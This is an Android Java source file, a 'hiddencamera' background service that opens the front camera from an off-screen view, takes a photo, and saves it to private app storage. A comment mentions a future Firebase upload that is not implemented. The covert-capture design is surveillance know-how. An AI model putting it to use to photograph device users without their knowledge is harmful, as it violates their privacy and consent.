package com.example.hiddencamera;

import android.app.Service;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import android.view.TextureView;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import static android.content.ContentValues.TAG;

public class cameraservice extends Service implements TextureView.SurfaceTextureListener {
    @Nullable


    private Camera mCamera;
    private TextureView mTextureView;
    Context context  = null;


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Let it continue running until it is stopped.
        Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
        Log.d(TAG, "onStartCommand: ");
        context =this;

        mTextureView = new TextureView(this);
        mTextureView.setSurfaceTextureListener(this);
        //setContentView(mTextureView);



        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
    }

    @Override
    public void onSurfaceTextureAvailable(SurfaceTexture surface, int width, int height) {


        int i = findFrontFacingCamera();

        mCamera = Camera.open(i);

        try {
            mCamera.setPreviewTexture(surface);
        } catch (IOException e) {
            e.printStackTrace();
        }
        mCamera.startPreview();
        mCamera.takePicture(null,null,mPictureCallback);


    }

    private void stopCamera() {

        if (this.mCamera != null) {
            this.mCamera.stopPreview();
            this.mCamera.release();
            this.mCamera = null;
        }
    }

    @Override
    public void onSurfaceTextureSizeChanged(SurfaceTexture surface, int width, int height) {
        // Ignored, Camera does all the work for us

    }

    @Override
    public boolean onSurfaceTextureDestroyed(SurfaceTexture surface) {

        //mCamera.stopPreview();
        //mCamera.release();
        //return true;
        return false;
    }


    @Override
    public void onSurfaceTextureUpdated(SurfaceTexture surface) {
        // Invoked every time there's a new Camera preview frame

    }




    private int findFrontFacingCamera() {
        int i = Camera.getNumberOfCameras();
        for (int j = 0;; j++) {
            if (j >= i)
                return -1;
            Camera.CameraInfo localCameraInfo = new Camera.CameraInfo();
            Camera.getCameraInfo(j, localCameraInfo);
            if (localCameraInfo.facing == 1)
                return j;
        }
    }




    Camera.PictureCallback mPictureCallback = new Camera.PictureCallback() {

        public void onPictureTaken(byte[] data, Camera camera) {
            if (data != null) {
                // Intent mIntent = new Intent();
                // mIntent.putExtra("image",imageData);

                mCamera.stopPreview();
                mCamera.release();

                Toast.makeText(context, "File Creating", Toast.LENGTH_SHORT).show();

                try {
                    BitmapFactory.Options opts = new BitmapFactory.Options();
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0,
                            data.length, opts);
                    bitmap = Bitmap.createScaledBitmap(bitmap, 300, 300, false);
                    int width = bitmap.getWidth();
                    int height = bitmap.getHeight();
                    int newWidth = 300;
                    int newHeight = 300;

                    // calculate the scale - in this case = 0.4f
                    float scaleWidth = ((float) newWidth) / width;
                    float scaleHeight = ((float) newHeight) / height;

                    // createa matrix for the manipulation
                    Matrix matrix = new Matrix();
                    // resize the bit map
                    matrix.postScale(scaleWidth, scaleHeight);
                    // rotate the Bitmap
                    matrix.postRotate(-90);
                    Bitmap resizedBitmap = Bitmap.createBitmap(bitmap, 0, 0,
                            width, height, matrix, true);

                    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
                    resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 40,
                            bytes);

                    // you can create a new file name "test.jpg" in sdcard
                    // folder.

                    ContextWrapper cw = new ContextWrapper(getApplicationContext());
                    // path to /data/data/yourapp/app_data/imageDir
                    File directory = cw.getDir("imageDir", Context.MODE_PRIVATE);
                    // Create imageDir
                    File f=new File(directory,"profile.jpg");

                    /*File f = new File(Environment.getExternalStorageDirectory()
                            + File.separator + "test.jpg");
*/
                    System.out.println("File F : " + f );


                    f.createNewFile();
                    // write the bytes in file
                    FileOutputStream fo = new FileOutputStream(f);
                    fo.write(bytes.toByteArray());

                    //Upload URI FILE to Firebase
                    Uri img = Uri.fromFile(new File(String.valueOf(f)));
                    Toast.makeText(cw,"oye ye rhi img: "+img, Toast.LENGTH_SHORT).show();

                    // remember close de FileOutput
                    fo.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                // StoreByteImage(mContext, imageData, 50,"ImageName");
                // setResult(FOTO_MODE, mIntent);
                //setResult(585);
                //finish();
            }
        }
    };

}
